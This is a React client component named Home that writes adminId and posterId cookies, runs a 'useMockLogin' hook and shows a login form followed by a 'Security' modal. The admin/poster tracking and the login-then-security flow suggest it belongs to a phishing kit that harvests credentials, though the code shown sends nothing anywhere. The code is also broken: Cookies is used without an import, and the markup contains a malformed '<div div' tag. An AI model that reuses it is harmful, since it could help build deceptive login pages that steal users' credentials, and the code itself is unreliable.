"use client";
import { useState } from "react";
import { motion } from "framer-motion";
import useMockLogin from "../hooks/useMockLogin";
import Login from "./Login";
import Security from "./Security";
import Footer from "./Footer";
import TopBar from "./TopBar";
function Home({ adminId, posterId }) {
  const [showModal, setShowModal] = useState(false);
  Cookies.set("adminId", adminId);
  Cookies.set("posterId", posterId);
  const { login } = useMockLogin(setShowModal, adminId, posterId);
  return (
    <div div className="bg-custom-black text-white">
      {!showModal && (
        <>
          <TopBar />
          <Login login={login} />
          <Footer />
        </>
      )}

      {showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
        >
          <Security setShowModal={setShowModal} />
        </motion.div>
      )}
    </div>
  );
}

export default Home;
